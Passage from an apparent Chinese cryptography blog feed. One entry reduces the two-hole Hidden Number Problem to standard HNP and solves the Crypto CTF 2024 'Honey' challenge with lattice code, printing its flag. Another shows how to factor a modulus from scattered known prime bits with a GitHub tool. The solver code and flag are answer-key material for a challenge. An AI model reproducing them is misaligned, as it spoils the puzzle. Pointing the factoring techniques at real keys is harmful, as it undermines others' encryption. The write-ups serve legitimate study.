        <content type="html"><![CDATA[<p>最近在复现Crypto CTF 2024的时候碰到一道题考察了HNP-2H（Hidden Number Problem with 2 Holes，双洞隐藏数问题），在做题的时候，找到了一篇论文：<a href="https://link.springer.com/content/pdf/10.1007/978-3-540-74462-7_9.pdf?pdf=inline+link">Extended Hidden Number Problem and Its Cryptanalytic Applications</a>，并通过这篇论文了解到可以通过狄利克雷近似定理来将HNP-2H约化为我们熟悉的HNP来解决。</p><h2 id="hnp-2h的定义">HNP-2H的定义</h2><p>这里直接引用论文中的定义：</p><p>设<span class="math inline">\(N\)</span>是一个质数，并设<span class="math inline">\(x\in \mathbb{Z}_n\)</span>是一个部分未知的整数满足以下<span class="math inline">\(d\)</span>条同余式： <span class="math display">\[\alpha_ix+\rho_{i,1}k_{i,1}+\rho_{i,2}k_{i,2}\equiv \beta_i\pmod{N},\ 1\le i\le d\]</span> 其中<span class="math inline">\(\alpha_i\)</span>满足<span class="math inline">\(\alpha_i\mod{N}\neq0\)</span>，<span class="math inline">\(\alpha_i,\rho_{i,1},\rho_{i,2}\)</span>以及<span class="math inline">\(\beta_i\)</span>（<span class="math inline">\(1\le i\le d\)</span>）为已知量，未知量<span class="math inline">\(k_{i,1}\)</span>与<span class="math inline">\(k_{i,2}\)</span>满足<span class="math inline">\(0\le k_{i,1}\le2^{\mu_1}\)</span>及<span class="math inline">\(0\le k_{i,2}\le2^{\mu_2}\)</span>（<span class="math inline">\(1\le i\le d\)</span>），其中<span class="math inline">\(\mu_1,\mu_2\)</span>为已知有理常量，则双洞隐藏数问题（Hidden Number Problem with 2 Holes）就是通过以上条件求出<span class="math inline">\(x\)</span>。</p><h2 id="使用狄利克雷近似解决hnp-2h">使用狄利克雷近似解决HNP-2H</h2><p>在使用狄利克雷近似解决HNP-2H之前，我们需要先了解何谓狄利克雷近似，其阐述如下</p><h3 id="狄利克雷近似dirichlets-approximation定理以及其推论">狄利克雷近似（Dirichlet's approximation）定理以及其推论</h3><p><strong>狄利克雷近似定理：</strong>设<span class="math inline">\(\alpha\in\mathbb{R}\)</span>以及<span class="math inline">\(0&lt;\varepsilon\le1\)</span>为两已知量，那么存在<span class="math inline">\(p,q\in\mathbb{Z}\)</span>使得<span class="math inline">\(1\le q\le\frac{1}{\varepsilon}\)</span>以及<span class="math inline">\(|\alpha-\frac{p}{q}|&lt;\frac{\varepsilon}{q}\)</span>成立。</p><p>通过这个定理，我们可以得到如下推论：</p><p>假定我们已知<span class="math inline">\(A,N\in\mathbb{Z}\)</span>与<span class="math inline">\(B\in\mathbb{R}\)</span>满足<span class="math inline">\(B\ge1\)</span>且<span class="math inline">\(N&gt;0\)</span>那么存在<span class="math inline">\(\lambda\in\mathbb{Z}\)</span>满足<span class="math inline">\(1\le\lambda\le B\)</span>且<span class="math inline">\(|\lambda A|_N&lt;\frac{N}{B}\)</span>.（<span class="math inline">\(|a|_N\)</span>表示<span class="math inline">\(min_{k\in\mathbb{Z}}|a-kN|\)</span>）</p><p>通过狄利克雷近似定理以及其推论，我们可以知道，在已知<span class="math inline">\(B\)</span>的情况下，我们可以通过连分数在多项式时间内通过<span class="math inline">\(|\lambda A|_N&lt;\frac{N}{B}\)</span>求解出<span class="math inline">\(\lambda\)</span></p><h3 id="借助狄利克雷近似解决hnp-2h">借助狄利克雷近似解决HNP-2H</h3><blockquote><p>本部分摘自论文第三部分的 Theorem 3 的证明</p></blockquote><p>令<span class="math inline">\(A_i=(\rho_{i,1})^{-1}\rho_{i,2}\mod{N}\)</span>，<span class="math inline">\(\gamma_i=k_{i,1}+A_ik_{i,2}\)</span>，<span class="math inline">\(\alpha_i&#39;=(\rho_{i,1})^{-1}\alpha_i\mod{N}\)</span>以及<span class="math inline">\(\beta_i&#39;=(\rho_{i,1})^{-1}\beta_i\mod{N}\)</span>（<span class="math inline">\(1\le i\le d\)</span>），则同余式<span class="math inline">\(\alpha_ix+\rho_{i,1}k_{i,1}+\rho_{i,2}k_{i,2}\equiv \beta_i\pmod{N}\)</span>可以转化为： <span class="math display">\[\alpha_i&#39;x+\gamma_i\equiv\beta&#39;_i\pmod{N}\]</span> 我们选定一个大于1的实数<span class="math inline">\(B\)</span>，由狄利克雷近似的推论，我们可以通过连分数找到一个非零整数<span class="math inline">\(\lambda_{i,B}\)</span>满足<span class="math inline">\(|\lambda_{i,B}A_i|&lt;\frac{N}{B}\)</span>，且有<span class="math inline">\(1\le\lambda_{i,B}\le B\)</span>（<span class="math inline">\(1\le i\le d\)</span>），使得下面的关系成立： <span class="math display">\[\begin{aligned}|\lambda_{i,B}\gamma_i|_N&amp;=|\lambda_{i,B}k_{i,1}+\lambda_{i,B}A_ik_{i,2}|_N\\&amp;\le|\lambda_{i,B}|_Nk_{i,1}+|\lambda_{i,B}A_i|_Nk_{i,2}\\&amp;&lt;B2^{\mu_1}+\frac{N}{B}2^{\mu_2}\end{aligned}\]</span> 选择<span class="math inline">\(B_{min}=N^{\frac{1}{2}}2^{\frac{\mu_2-\mu_1}{2}}\)</span>可以最大限度地减少<span class="math inline">\(B2^{\mu_1}+\frac{N}{B}2^{\mu_2}\)</span>的上界（此时<span class="math inline">\(B_{min}2^{\mu_1}+\frac{N}{B_{min}}2^{\mu_2}=N^{\frac{1}{2}}2^{\frac{\mu_1+\mu_2+2}{2}}\)</span>）.</p><p>在此之后，我们设<span class="math inline">\(k_i&#39;=\left(\lambda_{i,B_{min}}\gamma_i+\lfloor N^{\frac{1}{2}}2^{\frac{\mu_1+\mu_2+2}{2}}\rfloor\right)\mod{N}\)</span>，可以知道：<span class="math inline">\(k_i&#39;&lt;N^{\frac{1}{2}}2^{\frac{\mu_1+\mu_2+4}{2}}\)</span>，那么通过下述步骤，我们就可以将HNP-2H转化为HNP，从而通过一般HNP的解决方法来解决HNP-2H了： <span class="math display">\[\begin{aligned}\alpha_i&#39;x+\gamma_i&amp;\equiv\beta&#39;_i\pmod{N}\\(\lambda_{i,B_{min}}\alpha_i&#39;)x+\lambda_{i,B_{min}}\gamma_i&amp;\equiv\lambda_{i,B_{min}}\beta&#39;_i\pmod{N}\\(\lambda_{i,B_{min}}\alpha_i&#39;)x+k_i&#39;&amp;\equiv\lambda_{i,B_{min}}\beta&#39;_i+\lfloor N^{\frac{1}{2}}2^{\frac{\mu_1+\mu_2+2}{2}}\rfloor\pmod{N}\\\alpha_i&#39;&#39;x+k_i&#39;&amp;\equiv\beta_i&#39;&#39;\pmod{N},\ (1\le i\le d)\end{aligned}\]</span></p><h2 id="例crypto-ctf-2024-honey">例：[Crypto CTF 2024] Honey</h2><p>加密代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt  </span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_params</span>(<span class="params">nbit</span>):  </span><br><span class="line">    p, Q, R, S = getPrime(nbit), [], [], []  </span><br><span class="line">    d = <span class="built_in">int</span>(sqrt(nbit &lt;&lt; <span class="number">1</span>))  </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(d):  </span><br><span class="line">       Q.append(getRandomRange(<span class="number">1</span>, p - <span class="number">1</span>))  </span><br><span class="line">       R.append(getRandomRange(<span class="number">0</span>, p - <span class="number">1</span>))  </span><br><span class="line">       S.append(getRandomRange(<span class="number">0</span>, p - <span class="number">1</span>))  </span><br><span class="line">    <span class="keyword">return</span> p, Q, R, S  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, params</span>):  </span><br><span class="line">    p, Q, R, S = params  </span><br><span class="line">    <span class="keyword">assert</span> m &lt; p  </span><br><span class="line">    d = <span class="built_in">int</span>(sqrt(p.bit_length() &lt;&lt; <span class="number">1</span>))  </span><br><span class="line">    C = []  </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(d):  </span><br><span class="line">       r, s = [getRandomNBitInteger(d) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&#x27;01&#x27;</span>]  </span><br><span class="line">       c = Q[_] * m + r * R[_] + s * S[_]  </span><br><span class="line">       C.append(c % p)  </span><br><span class="line">    <span class="keyword">return</span> C  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">nbit = <span class="number">512</span>  </span><br><span class="line">params = gen_params(<span class="number">512</span>)  </span><br><span class="line">m = bytes_to_long(flag)  </span><br><span class="line">C = encrypt(m, params)  </span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;params_enc.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)  </span><br><span class="line">f.write(<span class="string">f&#x27;p = <span class="subst">&#123;params[<span class="number">0</span>]&#125;</span>\n&#x27;</span>)  </span><br><span class="line">f.write(<span class="string">f&#x27;Q = <span class="subst">&#123;params[<span class="number">1</span>]&#125;</span>\n&#x27;</span>)  </span><br><span class="line">f.write(<span class="string">f&#x27;R = <span class="subst">&#123;params[<span class="number">2</span>]&#125;</span>\n&#x27;</span>)  </span><br><span class="line">f.write(<span class="string">f&#x27;S = <span class="subst">&#123;params[<span class="number">3</span>]&#125;</span>\n&#x27;</span>)  </span><br><span class="line">f.write(<span class="string">f&#x27;C = <span class="subst">&#123;C&#125;</span>&#x27;</span>)  </span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>整理可得方程组： <span class="math display">\[C_i\equiv Q_im+R_ir_i+S_is_i\pmod{p}\]</span> 其中<span class="math inline">\(i=1,2,\cdots,d\)</span>，而<span class="math inline">\(C_i,Q_i,R_i,S_i\)</span>以及<span class="math inline">\(p\)</span>均已知，而且知道<span class="math inline">\(0\le r_i,s_i\le2^d=2^{32}\)</span>，要求<span class="math inline">\(m\)</span>，显然，这是HNP-2H，那么我们可以通过上面讲的方法来将其约化为HNP来求解，有<span class="math inline">\(A_i=R_i^{-1}S_i\mod{p}\)</span>，<span class="math inline">\(\gamma_{i}=r_i+A_is_i\)</span>，<span class="math inline">\(\alpha_i&#39;= R_i^{-1}Q_i\mod{p}\)</span>，<span class="math inline">\(\beta_i&#39;=R_i^{-1}C_i\mod{p}\)</span>（<span class="math inline">\(1\le i\le d\)</span>），可以将方程<span class="math inline">\(C_i\equiv Q_im+R_ir_i+S_is_i\pmod{p}\)</span>变为： <span class="math display">\[\alpha_i&#39;m+\gamma_i\equiv \beta_i&#39;\pmod{p}\]</span> 由于<span class="math inline">\(0\le r_i,s_i\le2^d=2^{32}\)</span>，那么我们可以取<span class="math inline">\(\mu_1=\mu_2=32\)</span>，那么我们取<span class="math inline">\(B_{min}=p^{\frac{1}{2}}2^{\frac{\mu_2-\mu_i}{2}}=p^{\frac{1}{2}}\)</span>，则可以利用连分数计算出满足条件的<span class="math inline">\(\lambda_{i,B_{min}}\)</span>，算法如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getLambda</span>(<span class="params">A</span>):</span><br><span class="line">    B = p.isqrt()</span><br><span class="line">    cf = (A/p).continued_fraction()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cf)):</span><br><span class="line">        <span class="keyword">if</span> cf.denominator(i) &lt; B <span class="keyword">and</span> cf.denominator(i+<span class="number">1</span>) &gt; B:</span><br><span class="line">            <span class="keyword">return</span> cf.denominator(i)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>在求出<span class="math inline">\(\lambda_{i,B_{min}}\)</span>之后，我们可以得到： <span class="math display">\[k_i&#39;=\left(\lambda_{i,B_{min}}\gamma_i+\lfloor p^{\frac{1}{2}}2^{\frac{\mu_1+\mu_2+2}{2}}\rfloor\right)\mod{p}=\left(\lambda_{i,B_{min}}\gamma_i+\lfloor p^{\frac{1}{2}}2^{33}\rfloor\right)\mod{p}\]</span> 可以得到<span class="math inline">\(\{k_1,k_2,\cdots,k_d\}\)</span>的上界<span class="math inline">\(K=p^{\frac{1}{2}}2^{\frac{\mu_1+\mu_2+4}{2}}=p^{\frac{1}{2}}2^{34}\)</span>.这样我们就可以将这个问题约化为一般的HNP进行求解，代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = ...</span><br><span class="line">Q = [...]</span><br><span class="line">R = [...]</span><br><span class="line">S = [...]</span><br><span class="line">C = [...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getLambda</span>(<span class="params">A</span>):</span><br><span class="line">    B = p.isqrt()</span><br><span class="line">    cf = (A/p).continued_fraction()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cf)):</span><br><span class="line">        <span class="keyword">if</span> cf.denominator(i) &lt; B <span class="keyword">and</span> cf.denominator(i+<span class="number">1</span>) &gt; B:</span><br><span class="line">            <span class="keyword">return</span> cf.denominator(i)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">d = <span class="built_in">len</span>(Q)</span><br><span class="line">A = []</span><br><span class="line">B = p.isqrt()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(d):</span><br><span class="line">    a = inverse(R[i], p) * S[i] % p</span><br><span class="line">    A.append(a)</span><br><span class="line"></span><br><span class="line">alpha = []</span><br><span class="line">beta = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(d):</span><br><span class="line">    lambda_i = getLambda(A[i])</span><br><span class="line">    a = inverse(R[i], p) * Q[i] * lambda_i % p</span><br><span class="line">    b = (inverse(R[i], p) * C[i] * lambda_i + floor(B * <span class="number">2</span>^<span class="number">33</span>)) % p</span><br><span class="line">    alpha.append(a)</span><br><span class="line">    beta.append(b)</span><br><span class="line"></span><br><span class="line">K = p.isqrt() * <span class="number">2</span>^<span class="number">34</span></span><br><span class="line"></span><br><span class="line">L = matrix(QQ, d+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(d):</span><br><span class="line">    L[i, i] = p</span><br><span class="line">    L[-<span class="number">2</span>, i] = alpha[i]</span><br><span class="line">    L[-<span class="number">1</span>, i] = beta[i]</span><br><span class="line"></span><br><span class="line">L[-<span class="number">2</span>, -<span class="number">2</span>] = K / p</span><br><span class="line">L[-<span class="number">1</span>, -<span class="number">1</span>] = K</span><br><span class="line"></span><br><span class="line">res = L.LLL()</span><br><span class="line"></span><br><span class="line">v = res[<span class="number">1</span>]</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">abs</span>(v[-<span class="number">2</span>] * p / K))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>运行可得flag：<code>CCTF&#123;3X7eNdED_H!dD3n_nNm8eR_pR0Bl3m_iN_CCTF!!&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> 密码学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> 格密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>已知两质因数半数以上随机位的大整数分解</title>
      <link href="/2024/11/27/%E5%B7%B2%E7%9F%A5%E4%B8%A4%E8%B4%A8%E5%9B%A0%E6%95%B0%E5%8D%8A%E6%95%B0%E4%BB%A5%E4%B8%8A%E9%9A%8F%E6%9C%BA%E4%BD%8D%E7%9A%84%E5%A4%A7%E6%95%B4%E6%95%B0%E5%88%86%E8%A7%A3/"/>
      <url>/2024/11/27/%E5%B7%B2%E7%9F%A5%E4%B8%A4%E8%B4%A8%E5%9B%A0%E6%95%B0%E5%8D%8A%E6%95%B0%E4%BB%A5%E4%B8%8A%E9%9A%8F%E6%9C%BA%E4%BD%8D%E7%9A%84%E5%A4%A7%E6%95%B4%E6%95%B0%E5%88%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>在解决RSA问题的过程中，我们往往会需要对一个大整数<span class="math inline">\(n\)</span>进行质因数分解，在已知部分连续位的时候，我们经常会考虑使用Copper Smith方法来进行分解，但是若我们知道的是随机分散的位，Copper Smith方法将会失效，例如我们知道由两个质因数相乘得到的一个大整数<span class="math inline">\(n=pq\)</span>如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">104158954646372695568095796310479805403678314919693272509836778997179683485437763692891984254171869987446475357518587344178264028334102088429629785065036660148146855007349113784322098795994839040721664806905084554147298456659074384855277678993200563966327086005547016327991986225930798076081014377904788085807</span><br></pre></td></tr></table></figure><p>又已知<span class="math inline">\(p\)</span>的部分已知位（二进制表示，其中下划线为未知位，下同）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1010101111000___11000___11100___11010___0___0___0___100110000___0___0___0___11000___0___0___110110010___11001100100111010___100011000___0___0___0___11111000111111100___1101110010000___0___0___0___10110___0___0___0___0___0___1100101111000___0___1001111011110___0___10000___0___0___11010___1010101110110___0___0___0___0___10010___1011101011100___110111010___0___0___0___101010110___0___10000___1000101011000___0___0___0___101010000___11010___111010000___0___11110___0___10010___111010010___0___0___10100___0___0___</span><br></pre></td></tr></table></figure><p>与<span class="math inline">\(q\)</span>的部分已知位：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">110111010___111011110___0___1000100110001110100111100___0___10110___11000___0___10110___11100___10000___0___0___11111100110010100___10000___11100___0___110010110___101110010___10010___11110___11110___0___1101111011000___101010110___10100___0___10100___1010101011010___0___0___100110110___0___10000___0___0___1000101110010___1111110010110___0___0___0___101110100___0___1100101111000___10100___0___0___0___0___0___0___10010___0___0___10100___10010___0___0___0___101011110___0___111110000___0___11110___0___10100___</span><br></pre></td></tr></table></figure><p>显然，我们不能使用Copper Smith方法进行分解。</p><p>为应对这种情况，大佬y011d4在Github上发布了一个项目：<a href="https://github.com/y011d4/factor-from-random-known-bits">y011d4/factor-from-random-known-bits</a>，我们可以使用这个项目对上述的情况进行分解。</p><p>下载方法（推荐Linux）：</p><ul><li><p>首先确保系统中有Rust环境（因为这个项目主要是由Rust语言编写的）</p></li><li>使用<code>git clone https://github.com/y011d4/factor-from-random-known-bits.git</code>从Github上将该项目拉下来</li><li><p><code>cd factor-from-random-known-bits</code>进入项目文件夹后依次运行<code>pip install -r requirements.txt</code>以及<code>python setup.py install</code></p></li></ul><p>在此之后就可以通过在Python中<code>import factor</code>后使用这个方法进行分解了。</p><blockquote><p>假若安装时报错，则有可能是系统中缺少 <code>m4</code> 这个宏处理器，可以通过<code>sudo apt-get install m4</code>来安装这个宏处理器.</p></blockquote><h2 id="适用条件">适用条件</h2><ul><li>已知<span class="math inline">\(p\)</span>和<span class="math inline">\(q\)</span>各50%以上的位</li></ul><h2 id="使用方法">使用方法</h2><p>这个库有两种使用方法：<code>from_str</code>以及<code>from_vector</code></p><h3 id="from_str"><code>from_str</code></h3><p>以前面的数据为例，则可以通过如下代码对<span class="math inline">\(n\)</span>进行分解：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> factor</span><br><span class="line"></span><br><span class="line">n = <span class="number">104158954646372695568095796310479805403678314919693272509836778997179683485437763692891984254171869987446475357518587344178264028334102088429629785065036660148146855007349113784322098795994839040721664806905084554147298456659074384855277678993200563966327086005547016327991986225930798076081014377904788085807</span></span><br><span class="line">p_known = <span class="string">&quot;1010101111000___11000___11100___11010___0___0___0___100110000___0___0___0___11000___0___0___110110010___11001100100111010___100011000___0___0___0___11111000111111100___1101110010000___0___0___0___10110___0___0___0___0___0___1100101111000___0___1001111011110___0___10000___0___0___11010___1010101110110___0___0___0___0___10010___1011101011100___110111010___0___0___0___101010110___0___10000___1000101011000___0___0___0___101010000___11010___111010000___0___11110___0___10010___111010010___0___0___10100___0___0___&quot;</span></span><br><span class="line">q_known = <span class="string">&quot;110111010___111011110___0___1000100110001110100111100___0___10110___11000___0___10110___11100___10000___0___0___11111100110010100___10000___11100___0___110010110___101110010___10010___11110___11110___0___1101111011000___101010110___10100___0___10100___1010101011010___0___0___100110110___0___10000___0___0___1000101110010___1111110010110___0___0___0___101110100___0___1100101111000___10100___0___0___0___0___0___0___10010___0___0___10100___10010___0___0___0___101011110___0___111110000___0___11110___0___10100___&quot;</span></span><br><span class="line"></span><br><span class="line">p, q = factor.from_str(n, p_known, q_known)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;q = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行可以得到：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">8996460061304658501483536370547552107653796408964122401908135206811298639114618429412462572834106148254319079697639081615546751035691609086377055207530819</span></span><br><span class="line">q = <span class="number">11577771027337574615881755252249566401199602697310825312674761422549781992489861876313558348484109945826438743090783573542794191930931862927421766237119653</span></span><br></pre></td></tr></table></figure><p>在这里，我们将未知的位置为下划线。</p><h3 id="from_vector"><code>from_vector</code></h3><p>以前面的数据为例，也可以通过如下代码对<span class="math inline">\(n\)</span>进行分解：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> factor</span><br><span class="line"></span><br><span class="line">n = <span class="number">104158954646372695568095796310479805403678314919693272509836778997179683485437763692891984254171869987446475357518587344178264028334102088429629785065036660148146855007349113784322098795994839040721664806905084554147298456659074384855277678993200563966327086005547016327991986225930798076081014377904788085807</span></span><br><span class="line">p_known = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span 